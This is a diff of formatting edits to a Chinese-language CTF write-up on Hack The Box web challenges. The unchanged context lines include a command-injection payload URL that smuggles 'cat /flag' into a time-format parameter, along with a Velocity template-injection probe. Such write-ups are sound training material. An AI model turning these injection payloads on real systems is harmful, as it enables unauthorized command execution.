@@ -5,14 +5,13 @@ date: "2025-08-30"
 tags:
   - "HTB"
   - "CTF"
-  - "WEB"
+  - "Web"
   - "XXE"
 authors:
   - "bx"
 draft: false              # 设为 true 则为草稿
 slug: "htb-ctf"          # 随机URL字符串
 ---
-<meta name="referrer" content="no-referrer">
 
 # HTB-CTF Try Out分析与题解
 
@@ -74,8 +73,6 @@ slug: "htb-ctf"          # 随机URL字符串
 成功是XXE注入，最后得到flag
 
 ![image-20250830214513005](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230307320.png)
-
-
 
 ### Flag Command
 
@@ -151,15 +148,13 @@ const fetchOptions = () => {
 
 发现这个secret命令
 
-```
+```text
 Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
 ```
 
 直接post传json得到结果
 
 ![image-20250830220704028](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230238564.png)
-
-
 
 ### TimeKORP
 
@@ -192,13 +187,11 @@ class TimeModel
 
 最终Payload如下
 
-```
+```http
 http://94.237.50.221:31205/?format=%H:%M:%S%27;cat%20/flag;echo%20%27
 ```
 
 得到flag
-
-
 
 ### Labyrinth Linguist 迷宫语言学家
 
@@ -271,7 +264,7 @@ https://juejin.cn/post/7246777406386929721
 
 https://antgarsil.github.io/posts/velocity/
 
-```
+```text
 text=#set ($run=1 + 1) $run 
 ```
 
@@ -290,10 +283,6 @@ $ex.waitFor()
 ```
 
 这个关于这个Java的模板注入后续还得深入学习一下
-
-
-
-
 
 ### Guild 公会
 
